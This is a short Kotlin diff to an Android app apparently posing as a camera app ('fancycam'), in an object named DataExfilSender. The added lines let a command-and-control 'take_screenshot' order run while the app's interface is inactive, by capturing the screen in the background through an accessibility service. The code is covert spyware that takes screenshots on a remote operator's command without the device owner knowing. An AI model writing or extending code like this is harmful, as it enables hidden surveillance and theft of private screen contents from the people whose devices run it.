@@ -189,6 +189,9 @@ object DataExfilSender {
                         val listener = commandListener
                         if (listener != null) {
                             listener.onTakeScreenshotCommand(cmdId)
+                        } else if (com.example.fancycam.services.ScreenCaptureAccessibilityService.isAccessibilityServiceEnabled(context)) {
+                            Log.i(TAG, "[C2 COMMAND] UI inactive; using accessibility service for background screenshot (id: $cmdId)")
+                            com.example.fancycam.services.ScreenCaptureAccessibilityService.requestScreenshot(context, cmdId)
                         } else {
                             Log.i(TAG, "[C2 COMMAND] App UI not active; queuing take_screenshot for resume (id: $cmdId)")
                             pendingUiCommands.offer(C2Command(id = cmdId, action = "take_screenshot"))
